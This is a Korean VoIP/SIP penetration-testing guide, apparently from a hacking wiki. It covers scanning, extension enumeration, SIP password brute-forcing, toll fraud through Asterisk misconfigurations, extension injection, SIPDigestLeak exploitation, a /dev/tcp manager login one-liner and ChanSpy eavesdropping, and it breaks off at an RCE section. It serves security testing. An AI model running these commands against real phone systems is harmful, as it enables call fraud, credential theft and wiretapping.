# VoIP 기본 정보

VoIP가 어떻게 작동하는지 배우려면 확인하세요:

{% content-ref url="basic-voip-protocols/" %}
[basic-voip-protocols](basic-voip-protocols/)
{% endcontent-ref %}

## 기본 메시지
```
Request name	Description								RFC references
------------------------------------------------------------------------------------------------------
REGISTER	Register a SIP user.							RFC 3261
INVITE		Initiate a dialog for establishing a call. 				RFC 3261
ACK		Confirm that an entity has received.					RFC 3261
BYE		Signal termination of a dialog and end a call.				RFC 3261
CANCEL		Cancel any pending request.						RFC 3261
UPDATE		Modify the state of a session without changing the state of the dialog.	RFC 3311
REFER		Ask recipient to issue a request for the purpose of call transfer.	RFC 3515
PRACK		Provisional acknowledgement.						RFC 3262
SUBSCRIBE	Initiates a subscription for notification of events from a notifier.	RFC 6665
NOTIFY		Inform a subscriber of notifications of a new event.			RFC 6665
PUBLISH		Publish an event to a notification server.				RFC 3903
MESSAGE		Deliver a text message.	Used in instant messaging applications.		RFC 3428
INFO		Send mid-session information that does not modify the session state.	RFC 6086
OPTIONS		Query the capabilities of an endpoint					RFC 3261
```
## 응답 코드

**1xx—임시 응답**
```
100 Trying
180 Ringing
181 Call is Being Forwarded
182 Queued
183 Session Progress
199 Early Dialog Terminated
```
**2xx—성공적인 응답**
```
200 OK
202 Accepted
204 No Notification
```
**3xx—리다이렉션 응답**
```
300 Multiple Choices
301 Moved Permanently
302 Moved Temporarily
305 Use Proxy
380 Alternative Service
```
**4xx—클라이언트 실패 응답**
```
400 Bad Request
401 Unauthorized
402 Payment Required
403 Forbidden
404 Not Found
405 Method Not Allowed
406 Not Acceptable
407 Proxy Authentication Required
408 Request Timeout
409 Conflict
410 Gone
411 Length Required
412 Conditional Request Failed
413 Request Entity Too Large
414 Request-URI Too Long
415 Unsupported Media Type
416 Unsupported URI Scheme
417 Unknown Resource-Priority
420 Bad Extension
421 Extension Required
422 Session Interval Too Small
423 Interval Too Brief
424 Bad Location Information
425 Bad Alert Message
428 Use Identity Header
429 Provide Referrer Identity
430 Flow Failed
433 Anonymity Disallowed
436 Bad Identity-Info
437 Unsupported Certificate
438 Invalid Identity Header
439 First Hop Lacks Outbound Support
440 Max-Breadth Exceeded
469 Bad Info Package
470 Consent Needed
480 Temporarily Unavailable
481 Call/Transaction Does Not Exist
482 Loop Detected
483 Too Many Hops
484 Address Incomplete
485 Ambiguous
486 Busy Here
487 Request Terminated
488 Not Acceptable Here
489 Bad Event
491 Request Pending
493 Undecipherable
494 Security Agreement Required
```
**5xx—서버 오류 응답**
```
500 Internal Server Error
501 Not Implemented
502 Bad Gateway
503 Service Unavailable
504 Server Time-out
505 Version Not Supported
513 Message Too Large
555 Push Notification Service Not Supported
580 Precondition Failure
```
**6xx—전역 실패 응답**
```
600 Busy Everywhere
603 Decline
604 Does Not Exist Anywhere
606 Not Acceptable
607 Unwanted
608 Rejected
```
## VoIP 열거

### 전화 번호

레드팀이 할 수 있는 첫 번째 단계 중 하나는 OSINT 도구, Google 검색 또는 웹 페이지를 스크래핑하여 회사와 연락할 수 있는 전화 번호를 찾는 것입니다.

전화 번호를 확보한 후 온라인 서비스를 사용하여 운영자를 식별할 수 있습니다:

* [https://www.numberingplans.com/?page=analysis\&sub=phonenr](https://www.numberingplans.com/?page=analysis\&sub=phonenr)
* [https://mobilenumbertracker.com/](https://mobilenumbertracker.com/)
* [https://www.whitepages.com/](https://www.whitepages.com/)
* [https://www.twilio.com/lookup](https://www.twilio.com/lookup)

운영자가 VoIP 서비스를 제공하는지 여부를 파악하여 회사가 VoIP를 사용하는지 확인할 수 있습니다... 게다가, 회사가 VoIP 서비스를 고용하지 않았지만 PSTN 카드를 사용하여 자체 VoIP PBX를 전통 전화망에 연결하는 경우도 있습니다.

음악이나 자동 응답과 같은 것들은 보통 VoIP가 사용 중임을 나타냅니다.

### Google Dorks
```bash
# Grandstream phones
intitle:"Grandstream Device Configuration" Password
intitle:"Grandstream Device Configuration" (intext:password & intext:"Grandstream Device Configuration" & intext:"Grandstream Networks" | inurl:cgi-bin) -.com|org

# Cisco Callmanager
inurl:"ccmuser/logon.asp"
intitle:"Cisco CallManager User Options Log On" "Please enter your User ID and Password in the spaces provided below and click the Log On button"

# Cisco phones
inurl:"NetworkConfiguration" cisco

# Linksys phones
intitle:"Sipura SPA Configuration"

# Snom phones
intitle:"snom" intext:"Welcome to Your Phone!" inurl:line_login.htm

# Polycom SoundPoint IP & phones
intitle:"SoundPoint IP Configuration Utility - Registration"
"Welcome to Polycom Web Configuration Utility" "Login as" "Password"
intext: "Welcome to Polycom Web Configuration Utility" intitle:"Polycom - Configuration Utility" inurl:"coreConf.htm"
intitle:"Polycom Login" inurl:"/login.html"
intitle:"Polycom Login" -.com

# Elastix
intitle:"Elastix - Login page" intext:"Elastix is licensed under GPL"

# FreePBX
inurl:"maint/index.php?FreePBX" intitle: "FreePBX" intext:"FreePBX Admministration"
```
### OSINT 정보

VoIP 소프트웨어를 식별하는 데 도움이 되는 다른 OSINT 열거는 레드팀에 도움이 될 것입니다.

### 네트워크 열거

- **`nmap`**은 UDP 서비스를 스캔할 수 있지만, 스캔되는 UDP 서비스의 수가 많기 때문에 이러한 유형의 서비스에서는 매우 느리고 정확하지 않을 수 있습니다.
```bash
sudo nmap --script=sip-methods -sU -p 5060 10.10.0.0/24
```
* **`svmap`** SIPVicious에서 (`sudo apt install sipvicious`): 지정된 네트워크에서 SIP 서비스를 찾습니다.
* `svmap`은 User-Agent `friendly-scanner`를 사용하기 때문에 **차단하기 쉽습니다**, 그러나 `/usr/share/sipvicious/sipvicious`의 코드를 수정하여 변경할 수 있습니다.
```bash
# Use --fp to fingerprint the services
svmap 10.10.0.0/24 -p 5060-5070 [--fp]
```
* **`SIPPTS scan`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS 스캔은 UDP, TCP 또는 TLS를 통해 SIP 서비스를 매우 빠르게 스캔하는 도구입니다. 멀티스레드를 사용하며 대규모 네트워크 범위를 스캔할 수 있습니다. 포트 범위를 쉽게 지정하고 TCP 및 UDP를 모두 스캔하며 다른 방법을 사용할 수 있습니다 (기본적으로 OPTIONS를 사용) 그리고 다른 User-Agent를 지정할 수 있습니다 (그리고 더 많은 기능).
```bash
sippts scan -i 10.10.0.0/24 -p all -r 5060-5080 -th 200 -ua Cisco [-m REGISTER]

[!] IP/Network: 10.10.0.0/24
[!] Port range: 5060-5080
[!] Protocol: UDP, TCP, TLS
[!] Method to scan: REGISTER
[!] Customized User-Agent: Cisco
[!] Used threads: 200
```
* **metasploit**:  

메타스플로잇:
```
auxiliary/scanner/sip/options_tcp normal  No     SIP Endpoint Scanner (TCP)
auxiliary/scanner/sip/options     normal  No     SIP Endpoint Scanner (UDP)
```
#### 추가 네트워크 열거

PBX는 다음과 같은 다른 네트워크 서비스를 노출할 수도 있습니다:

- **69/UDP (TFTP)**: 펌웨어 업데이트
- **80 (HTTP) / 443 (HTTPS)**: 웹에서 장치 관리
- **389 (LDAP)**: 사용자 정보를 저장하는 대체 수단
- **3306 (MySQL)**: MySQL 데이터베이스
- **5038 (Manager)**: 다른 플랫폼에서 Asterisk 사용 가능
- **5222 (XMPP)**: Jabber를 사용한 메시지
- **5432 (PostgreSQL)**: PostgreSQL 데이터베이스
- 그 외...

### 방법 열거

`SIPPTS enumerate`를 사용하여 PBX에서 사용할 수 있는 **어떤 방법이 있는지** 찾을 수 있습니다. [**sippts**](https://github.com/Pepelux/sippts)에서 사용합니다.
```bash
sippts enumerate -i 10.10.0.10
```
### 서버 응답 분석

우리에게 다시 보내는 서버의 헤더를 분석하는 것은 매우 중요합니다. 우리가 보내는 메시지의 유형 및 헤더에 따라 달라집니다. [**sippts**](https://github.com/Pepelux/sippts)의 `SIPPTS send`를 사용하여 모든 헤더를 조작하고 응답을 분석할 수 있습니다.
```bash
sippts send -i 10.10.0.10 -m INVITE -ua Grandstream -fu 200 -fn Bob -fd 11.0.0.1 -tu 201 -fn Alice -td 11.0.0.2 -header "Allow-Events: presence" -sdp
```
또한 서버가 웹소켓을 사용하는 경우 데이터를 얻을 수도 있습니다. [**sippts**](https://github.com/Pepelux/sippts)의 `SIPPTS wssend`를 사용하여 개인화된 WS 메시지를 보낼 수 있습니다.
```bash
sippts wssend -i 10.10.0.10 -r 443 -path /ws
```
### Extension Enumeration

PBX(사설 분기 교환) 시스템의 내선(Extensions)은 조직이나 기업 내에서 개별 전화 라인, 장치 또는 사용자에 할당된 **고유한 내부 식별자**를 가리킵니다. 내선을 사용하면 각 사용자나 장치에 대해 개별 외부 전화 번호가 필요하지 않고도 **조직 내에서 통화를 효율적으로 라우팅**할 수 있습니다.

* **`svwar`** from SIPVicious (`sudo apt install sipvicious`): `svwar`은 무료 SIP PBX 내선 라인 스캐너입니다. 개념적으로는 **내선 범위를 추측하거나 주어진 내선 목록을 추측**함으로써 전통적인 워다이얼러와 유사하게 작동합니다.
```bash
svwar 10.10.0.10 -p5060 -e100-300 -m REGISTER
```
* **`SIPPTS exten`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS exten은 SIP 서버의 내선을 식별합니다. Sipexten은 대규모 네트워크 및 포트 범위를 확인할 수 있습니다.
```bash
sippts exten -i 10.10.0.10 -r 5060 -e 100-200
```
* **metasploit**: 메타스플로잇을 사용하여 확장자/사용자 이름을 열람할 수도 있습니다:
```
auxiliary/scanner/sip/enumerator_tcp  normal  No     SIP Username Enumerator (TCP)
auxiliary/scanner/sip/enumerator      normal  No     SIP Username Enumerator (UDP)
```
* **`enumiax` (`apt install enumiax`): enumIAX**는 Inter Asterisk Exchange 프로토콜 **사용자명 브루트 포스 열거기**입니다. enumIAX는 두 가지 다른 모드에서 작동할 수 있습니다; 순차적 사용자명 추측 또는 사전 공격.
```bash
enumiax -d /usr/share/wordlists/metasploit/unix_users.txt 10.10.0.10 # Use dictionary
enumiax -v -m3 -M3 10.10.0.10
```
## VoIP 공격

### 비밀번호 브루트 포스 - 온라인

**PBX** 및 일부 **내선/사용자 이름**을 발견한 후 레드팀은 일반적인 비밀번호 사전을 사용하여 인증을 브루트 포스하기 위해 **`REGISTER` 메소드를 통해 내선에 인증을 시도**할 수 있습니다.

{% hint style="danger" %}
**사용자 이름**이 내선과 동일할 수 있지만, 이는 PBX 시스템, 구성 및 조직의 기본 설정에 따라 다를 수 있습니다...

사용자 이름이 내선과 동일하지 않은 경우 **사용자 이름을 알아내어 브루트 포스해야** 합니다.
{% endhint %}

* SIPVicious의 **`svcrack`** (`sudo apt install sipvicious`) : SVCrack를 사용하면 PBX에서 특정 사용자 이름/내선의 비밀번호를 뚫을 수 있습니다.
```bash
svcrack -u100 -d dictionary.txt udp://10.0.0.1:5080 #Crack known username
svcrack -u100 -r1-9999 -z4 10.0.0.1 #Check username in extensions
```
* **`SIPPTS rcrack`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rcrack은 SIP 서비스를 위한 원격 암호 크래커입니다. Rcrack는 다양한 IP 및 포트 범위에서 여러 사용자의 암호를 테스트할 수 있습니다.
```bash
sippts rcrack -i 10.10.0.10 -e 100,101,103-105 -w wordlist/rockyou.txt
```
* **Metasploit**:
* [https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb](https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb)
* [https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack\_tcp.rb](https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack\_tcp.rb)

### VoIP 스니핑

만약 **오픈 와이파이 네트워크** 내에서 VoIP 장비를 발견한다면, **모든 정보를 스니핑**할 수 있습니다. 게다가, 더 **폐쇄적인 네트워크(이더넷으로 연결되거나 보호된 와이파이에 연결된 경우)** 내에 있다면 **ARP스푸핑**과 같은 **MitM 공격**을 수행하여 **PBX와 게이트웨이 사이**에서 정보를 스니핑할 수 있습니다.

네트워크 정보 중에서는 장비를 관리하기 위한 **웹 자격 증명**, 사용자 **내선번호**, **사용자명**, **IP** 주소, 심지어 **해시된 비밀번호** 및 **대화를 듣기 위해 재현할 수 있는 RTP 패킷** 등을 찾을 수 있습니다.

이 정보를 얻기 위해 Wireshark, tcpdump와 같은 도구를 사용할 수 있지만, **VoIP 대화를 스니핑하는 데 특별히 만들어진 도구인** [**ucsniff**](https://github.com/Seabreg/ucsniff)를 사용할 수 있습니다.

{% hint style="danger" %}
**SIP 통신에서 TLS가 사용된 경우** SIP 통신을 알아볼 수 없습니다.\
**SRTP** 및 **ZRTP**가 사용된 경우도 **RTP 패킷이 평문으로 표시되지 않습니다**.
{% endhint %}

#### SIP 자격 증명 (비밀번호 브루트포스 - 오프라인)

**SIP REGISTER 통신**을 더 잘 이해하기 위해 [이 예제를 확인하십시오](basic-voip-protocols/sip-session-initiation-protocol.md#sip-register-example) **전송되는 자격 증명**을 알아보기 위해.

* **`sipdump`** 및 **`sipcrack`,** **sipcrack**의 일부 (`apt-get install sipcrack`): 이러한 도구는 SIP 프로토콜 내에서 **다이제스트 인증**을 **추출**하고 **브루트포스**할 수 있는 **pcap**에서 작동합니다.
```bash
sipdump -p net-capture.pcap sip-creds.txt
sipcrack sip-creds.txt -w dict.txt
```
* **`SIPPTS 덤프`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS 덤프는 pcap 파일에서 다이제스트 인증을 추출할 수 있습니다.
```bash
sippts dump -f capture.pcap -o data.txt
```
* **`SIPPTS dcrack`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS dcrack은 SIPPTS 덤프로 얻은 다이제스트 인증을 크랙하는 도구입니다.
```bash
sippts dcrack -f data.txt -w wordlist/rockyou.txt
```
* **`SIPPTS tshark`**은 [**sippts**](https://github.com/Pepelux/sippts)**에서 제공하는 도구**입니다:** SIPPTS tshark는 PCAP 파일에서 SIP 프로토콜의 데이터를 추출합니다.
```bash
sippts tshark -f capture.pcap [-filter auth]
```
#### DTMF 코드

네트워크 트래픽에서는 SIP 자격 증명 뿐만 아니라 **음성 사서함**에 액세스하는 데 사용되는 DTMF 코드도 발견할 수 있습니다.\
이러한 코드를 **INFO SIP 메시지**, **오디오** 또는 **RTP 패킷** 내에 전송할 수 있습니다. RTP 패킷 내에 코드가 포함되어 있는 경우 대화의 해당 부분을 잘라내어 도구 multimo를 사용하여 추출할 수 있습니다:
```bash
multimon -a DTMF -t wac pin.wav
```
### 무료 통화 / Asterisks 연결 구성 오류

Asterisk에서는 **특정 IP 주소** 또는 **모든 IP 주소**로부터의 연결을 허용할 수 있습니다:
```
host=10.10.10.10
host=dynamic
```
만약 IP 주소가 지정된다면, 호스트는 주기적으로 REGISTER 요청을 보낼 필요가 없을 것입니다 (REGISTER 패킷에는 일반적으로 30분인 TTL이 포함되어 있으며, 다른 시나리오에서는 전화기가 30분마다 REGISTER해야 합니다). 그러나 VoIP 서버로부터의 통화를 받기 위해 연결을 허용하는 열린 포트가 필요할 것입니다.

사용자를 정의하는 방법은 다음과 같습니다:

- **`type=user`**: 사용자는 사용자로써 통화를 받을 수 있습니다.
- **`type=friend`**: 피어로 통화를 수행하고 사용자로써 통화를 받을 수 있습니다 (확장과 함께 사용됨)
- **`type=peer`**: SIP 트렁크로써 통화를 보내고 받을 수 있습니다.

또한 보안이 취약한 변수를 통해 신뢰를 설정할 수 있습니다:

- **`insecure=port`**: IP로 인증된 피어 연결을 허용합니다.
- **`insecure=invite`**: INVITE 메시지에 대한 인증이 필요하지 않습니다.
- **`insecure=port,invite`**: 둘 다

{% hint style="warning" %}
**`type=friend`**를 사용할 때, **host** 변수의 **값**은 사용되지 않으므로, 관리자가 그 값을 사용하여 SIP 트렁크를 잘못 구성하면 **누구나 연결할 수 있게 됩니다**.

예를 들어, 다음 구성은 취약할 수 있습니다:\
`host=10.10.10.10`\
`insecure=port,invite`\
`type=friend`
{% endhint %}

### 무료 통화 / Asterisk 컨텍스트 잘못 구성

Asterisk에서 **컨텍스트**는 다음을 그룹화하는 이름이 지정된 컨테이너 또는 섹션으로, 다이얼 플랜의 핵심 구성 요소입니다. 다이얼 플랜은 Asterisk 시스템의 핵심 구성 요소로, **들어오는 통화와 나가는 통화가 처리되고 경로 지정되는 방식을 정의**합니다. 컨텍스트는 다이얼 플랜을 구성하고, 액세스 제어를 관리하며, 시스템의 서로 다른 부분 간에 분리를 제공하기 위해 사용됩니다.

각 컨텍스트는 일반적으로 **`extensions.conf`** 파일에 정의됩니다. 컨텍스트는 대괄호로 표시되며, 컨텍스트 이름이 그 안에 포함됩니다. 예를 들면:
```bash
csharpCopy code[my_context]
```
다이얼된 번호의 패턴을 정의하고 해당 번호 패턴과 일련의 작업 또는 응용 프로그램을 연결합니다. 이러한 작업은 통화가 처리되는 방식을 결정합니다. 예를 들어:
```scss
[my_context]
exten => 100,1,Answer()
exten => 100,n,Playback(welcome)
exten => 100,n,Hangup()
```
이 예제는 "my\_context"라는 간단한 컨텍스트를 extension "100"으로 보여줍니다. 누군가가 100을 다이얼하면 통화가 받아지고 환영 메시지가 재생된 후 통화가 종료됩니다.

이것은 **다른 컨텍스트**로, **다른 번호로 전화를 걸 수 있게 합니다**:
```scss
[external]
exten => _X.,1,Dial(SIP/trunk/${EXTEN})
```
만약 관리자가 **기본 컨텍스트**를 다음과 같이 정의한다면:
```
[default]
include => my_context
include => external
```
{% hint style="warning" %}
누구나 **서버를 사용하여 다른 번호로 전화를 걸 수 있게 될 것**입니다 (그리고 서버의 관리자가 통화 비용을 지불해야 합니다).
{% endhint %}

{% hint style="danger" %}
게다가, 기본적으로 **`sip.conf`** 파일에는 **`allowguest=true`**가 포함되어 있으므로, **인증 없이** **어떤** 공격자도 다른 번호로 전화를 걸 수 있게 될 것입니다.
{% endhint %}

*   **`SIPPTS invite`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS invite는 **인증 없이 통화를 할 수 있는지 PBX 서버를 확인**합니다. SIP 서버가 잘못된 구성을 가지고 있다면, 외부 번호로 전화를 걸 수 있게 해줄 것입니다. 또한 통화를 두 번째 외부 번호로 전달할 수 있게 해줄 수도 있습니다.

예를 들어, Asterisk 서버의 잘못된 컨텍스트 구성이 있다면, 인증 없이 INVITE 요청을 수락할 수 있습니다. 이 경우, 공격자는 어떤 사용자/비밀번호도 알지 못한 채 전화를 걸 수 있습니다.
```bash
# Trying to make a call to the number 555555555 (without auth) with source number 200.
sippts invite -i  10.10.0.10 -fu 200 -tu 555555555 -v

# Trying to make a call to the number 555555555 (without auth) and transfer it to number 444444444.
sippts invite -i 10.10.0.10 -tu 555555555 -t 444444444
```
{% endcode %}

### 무료 통화 / 잘못 구성된 IVRS

IVRS는 **대화형 음성 응답 시스템(Interactive Voice Response System)**을 나타내며, 사용자가 음성 또는 터치톤 입력을 통해 컴퓨터화된 시스템과 상호 작용할 수 있는 전화 기술입니다. IVRS는 정보 제공, 전화 라우팅, 사용자 입력 캡처 등 다양한 기능을 제공하는 **자동화된 통화 처리** 시스템을 구축하는 데 사용됩니다.

VoIP 시스템의 IVRS는 일반적으로 다음을 포함합니다:

1. **음성 프롬프트(Voice prompts)**: 사용자를 IVR 메뉴 옵션 및 지시사항을 통해 안내하는 미리 녹음된 오디오 메시지.
2. **DTMF(Dual-Tone Multi-Frequency) 신호**: 전화기의 키를 눌러 생성된 터치톤 입력으로, IVR 메뉴를 탐색하고 입력을 제공하는 데 사용됩니다.
3. **통화 라우팅(Call routing)**: 사용자 입력에 기반하여 특정 부서, 에이전트 또는 내선과 같은 적절한 대상으로 전화를 연결하는 것.
4. **사용자 입력 캡처(User input capture)**: 전화하는 사람으로부터 계정 번호, 사례 ID 또는 기타 관련 데이터를 수집하는 것.
5. **외부 시스템과의 통합(Integration with external systems)**: IVR 시스템을 데이터베이스 또는 다른 소프트웨어 시스템에 연결하여 정보에 액세스하거나 업데이트하거나 작업을 수행하거나 이벤트를 트리거하는 것.

Asterisk VoIP 시스템에서는 **`extensions.conf`** 파일과 `Background()`, `Playback()`, `Read()` 등과 같은 다양한 응용 프로그램을 사용하여 다이얼 플랜을 사용하여 IVR을 생성할 수 있습니다. 이러한 응용 프로그램은 음성 프롬프트를 재생하고 사용자 입력을 캡처하며 통화 흐름을 제어하는 데 도움이 됩니다.

#### 취약한 구성 예시
```scss
exten => 0,100,Read(numbers,the_call,,,,5)
exten => 0,101,GotoIf("$[${numbers}"="1"]?200)
exten => 0,102,GotoIf("$[${numbers}"="2"]?300)
exten => 0,103,GotoIf("$[${numbers}"=""]?100)
exten => 0,104,Dial(LOCAL/${numbers})
```
이전에 사용자가 **1을 눌러** 부서에 전화를 걸라고 요청받거나, **2를 눌러** 다른 부서에 전화를 걸라고 요청받거나, 알고 있다면 **전화 내선 번호를 입력**하라는 예제입니다.\
취약점은 지정된 **내선 번호 길이가 확인되지 않아 사용자가 5초 타임아웃 동안 전체 번호를 입력하면 호출될 수 있다는 것**입니다.

### 내선 번호 주입

다음과 같은 내선 번호를 사용하여:
```scss
exten => _X.,1,Dial(SIP/${EXTEN})
```
**`${EXTEN}`**이 호출될 **내선 번호**를 나타냅니다. **내선 101이 입력**되면 다음과 같은 일이 발생합니다:
```scss
exten => 101,1,Dial(SIP/101)
```
그러나 **`${EXTEN}`**이 숫자 이상을 입력할 수 있도록 허용한다면 (이전 Asterisk 버전과 같이), 공격자는 **`101&SIP123123123`**을 입력하여 전화번호 123123123로 전화를 걸 수 있습니다. 그 결과는 다음과 같을 것입니다:
```scss
exten => 101&SIP123123123,1,Dial(SIP/101&SIP123123123)
```
따라서, 내선 **`101`** 및 **`123123123`**으로의 통화가 전송되며 통화를 받는 첫 번째 내선만 연결됩니다... 그러나 일치하는 내선이 없는 **내선을 우회하는 내선**을 사용하면, **원하는 번호로만 통화를 주입**할 수 있습니다.

## SIPDigestLeak 취약점

SIP Digest Leak는 하드웨어 및 소프트웨어 IP 전화기뿐만 아니라 전화기 어댑터(VoIP to analogue)를 포함한 다수의 SIP 전화기에 영향을 미치는 취약점입니다. 이 취약점은 **Digest 인증 응답 누출**을 허용하며, 이는 비밀번호에서 계산됩니다. **오프라인 비밀번호 공격이 가능**하며, 도전 응답을 기반으로 대부분의 비밀번호를 복구할 수 있습니다.

**[여기서 취약점 시나리오**](https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf):

1. IP 전화기(피해자)가 어떤 포트(예: 5060)에서 수신 대기 중이며 전화를 받음
2. 공격자가 IP 전화기로 INVITE를 전송
3. 피해자 전화기가 울리기 시작하고 누군가 전화를 받아서 끊음(상대편에서 전화를 받지 않아서)
4. 전화가 끊기면 **피해자 전화기가 공격자에게 BYE를 전송**
5. **공격자가 407 응답을 발행**하고 **인증을 요청**하며 인증 도전을 발행
6. **피해자 전화기가 두 번째 BYE에서 인증 도전에 대한 응답**을 제공
7. **공격자는 도전 응답에 대한 브루트 포스 공격**을 자신의 로컬 머신(또는 분산 네트워크 등)에서 실행하여 비밀번호를 추측할 수 있습니다

* [**sippts**](https://github.com/Pepelux/sippts)**의 SIPPTS leak**:** SIPPTS leak는 다수의 SIP 전화기에 영향을 미치는 SIP Digest Leak 취약점을 악용합니다. 결과물은 SipCrack 형식으로 저장되어 SIPPTS dcrack 또는 SipCrack 도구를 사용하여 브루트포스 공격할 수 있습니다.
```bash
sippts leak -i 10.10.0.10

[!] Target: 10.10.0.10:5060/UDP
[!] Caller: 100
[!] Callee: 100

[=>] Request INVITE
[<=] Response 100 Trying
[<=] Response 180 Ringing
[<=] Response 200 OK
[=>] Request ACK
... waiting for BYE ...
[<=] Received BYE
[=>] Request 407 Proxy Authentication Required
[<=] Received BYE with digest
[=>] Request 200 Ok

Auth=Digest username="pepelux", realm="asterisk", nonce="lcwnqoz0", uri="sip:100@10.10.0.10:56583;transport=UDP", response="31fece0d4ff6fd524c1d4c9482e99bb2", algorithm=MD5
```
### 클릭투콜

클릭투콜은 **웹 사용자**가 (예를 들어 제품에 관심이 있는 사용자) **전화번호를 제공**하여 전화를 받을 수 있는 기능을 제공합니다. 그런 다음 광고 전화가 걸리고 사용자가 **전화를 받으면 에이전트와 연결된 전화**가 사용자에게 걸립니다.

이 기능에 대한 일반적인 Asterisk 프로필은 다음과 같습니다:
```scss
[web_user]
secret = complex_password
deny = 0.0.0.0/0.0.0.0
allow = 0.0.0.0/0.0.0.0
displayconnects = yes
read = system,call,log,verbose,agent,user,config,dtmf,reporting,crd,diapla
write = system,call,agent,user,config,command,reporting,originate
```
* 이전 프로필은 **알려진 비밀번호로 연결하려는 모든 IP 주소를 허용**합니다.
* 이전에 명시된대로 **통화를 조직**하려면 **읽기 권한이 필요하지 않으며** **쓰기**에서 **원천**만 필요합니다.

이러한 권한으로 인해 알려진 비밀번호를 아는 모든 IP가 연결하고 너무 많은 정보를 추출할 수 있습니다.
```bash
# Get all the peers
exec 3<>/dev/tcp/10.10.10.10/5038 && echo -e "Action: Login\nUsername:test\nSecret:password\nEvents: off\n\nAction:Command\nCommand: sip show peers\n\nAction: logoff\n\n">&3 && cat <&3
```
{% endcode %}

**추가 정보나 조치를 요청할 수 있습니다.**

### **도청**

Asterisk에서는 **`ChanSpy`** 명령을 사용하여 **모니터링할 내선(s)**을 지정하여 대화를 듣는 것이 가능합니다. 이 명령은 내선에 할당되어야 합니다.

예를 들어, **`exten => 333,1,ChanSpy('all',qb)`**는 만약 **내선 333**을 **호출**하면, **`all`** 내선을 **모니터링**하고, 새 대화가 시작될 때마다 (**`b`**) 조용한 모드 (**`q`**)로 듣기를 시작합니다. 대화에서 다른 대화로 이동하려면 **`*`**를 누르거나 내선 번호를 표시할 수 있습니다.

또한 **`ExtenSpy`**를 사용하여 한 내선만 모니터링할 수도 있습니다.

대화를 듣는 대신, 파일에 **녹음**할 수도 있습니다. 다음과 같은 내선을 사용하여:

{% code overflow="wrap" %}
```scss
[recorded-context]
exten => _X.,1,Set(NAME=/tmp/${CONTEXT}_${EXTEN}_${CALLERID(num)}_${UNIQUEID}.wav)
exten => _X.,2,MixMonitor(${NAME})
```
{% endcode %}

통화는 **`/tmp`**에 저장됩니다.

Asterisk가 종료될 때 호출을 유출하는 스크립트를 실행할 수도 있습니다.
```scss
exten => h,1,System(/tmp/leak_conv.sh &)
```
### RTCPBleed 취약점

**RTCPBleed**은 2017년 발표된 Asterisk 기반 VoIP 서버를 영향을 주는 주요 보안 문제입니다. 이 취약점은 **VoIP 대화를 운반하는 RTP (실시간 프로토콜) 트래픽**이 **인터넷 상의 누구에 의해 가로채고 재지정될 수 있게 합니다**. 이는 RTP 트래픽이 NAT (네트워크 주소 변환) 방화벽을 통과할 때 인증을 우회하기 때문에 발생합니다.

RTP 프록시는 두 명 이상의 당사자 간의 RTP 스트림을 프록시하는 것으로 RTC 시스템에 영향을 주는 NAT 제한을 해결하려고 합니다. NAT가 적용된 경우 RTP 프록시 소프트웨어는 종종 시그널링 (예: SIP)을 통해 검색된 RTP IP 및 포트 정보에 의존할 수 없습니다. 따라서 여러 RTP 프록시는 이러한 **IP 및 포트 튜플이 자동으로 학습되는 메커니즘을 구현**했습니다. 이는 종종 들어오는 RTP 트래픽을 검사하고 들어오는 RTP 트래픽의 소스 IP 및 포트를 응답해야 하는 것으로 표시하는 방식으로 수행됩니다. 이 메커니즘은 "학습 모드"라고 불릴 수 있으며 **어떠한 형태의 인증도 사용하지 않습니다**. 따라서 **공격자**는 **RTP 프록시로 RTP 트래픽을 보낼 수 있으며** RTP 스트림의 호출자 또는 피호출자를 위해 의도된 프록시 RTP 트래픽을 수신할 수 있습니다. 우리는 이 취약점을 RTP Bleed라고 부르며, 이는 공격자가 합법적인 사용자에게 전송되어야 하는 RTP 미디어 스트림을 수신할 수 있게 합니다.

또 다른 흥미로운 RTP 프록시 및 RTP 스택의 동작은 때로는 **RTP Bleed에 취약하지 않더라도** **어떠한 소스에서도 RTP 패킷을 수락, 전달 및/또는 처리**할 수 있습니다. 따라서 공격자는 합법적인 것 대신 자신의 미디어를 삽입할 수 있는 RTP 패킷을 보낼 수 있습니다. 우리는 이 공격을 RTP 삽입이라고 부르며, 이는 존재하는 RTP 스트림에 부정한 RTP 패킷을 삽입할 수 있게 합니다. 이 취약점은 RTP 프록시 및 엔드포인트에서 발견될 수 있습니다.

Asterisk와 FreePBX는 전통적으로 **`NAT=yes` 설정**을 사용했으며, 이는 RTP 트래픽이 인증을 우회하도록 허용하여 통화 시 오디오가 없거나 일방적인 오디오로 이어질 수 있습니다.

자세한 정보는 [https://www.rtpbleed.com/](https://www.rtpbleed.com/)에서 확인하세요.

* **`SIPPTS rtpbleed`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtpbleed는 RTP Bleed 취약점을 감지하여 RTP 스트림을 보냅니다.
```bash
sippts rtpbleed -i 10.10.0.10
```
* **`SIPPTS rtcpbleed`**은 [**sippts**](https://github.com/Pepelux/sippts)**에서:** SIPPTS rtcpbleed는 RTCP 스트림을 보내 RTP Bleed 취약점을 감지합니다.
```bash
sippts rtcpbleed -i 10.10.0.10
```
* **`SIPPTS rtpbleedflood`**은 [**sippts**](https://github.com/Pepelux/sippts)**에서:** SIPPTS rtpbleedflood는 RTP 스트림을 전송하여 RTP Bleed 취약점을 악용합니다.
```bash
sippts rtpbleedflood -i 10.10.0.10 -p 10070 -v
```
* **`SIPPTS rtpbleedinject`**은 [**sippts**](https://github.com/Pepelux/sippts)**에서:** SIPPTS rtpbleedinject는 RTP Bleed 취약점을 이용하여 오디오 파일 (WAV 형식)을 삽입합니다.
```bash
sippts rtpbleedinject -i 10.10.0.10 -p 10070 -f audio.wav
```
### RCE

Asterisk에서 어떻게든 **extension 규칙을 추가하고 다시로드**할 수 있다면(예: 취약한 웹 매니저 서버를 침투함으로써), **`System`** 명령을 사용하여 RCE를 얻을 수 있습니다.
```scss
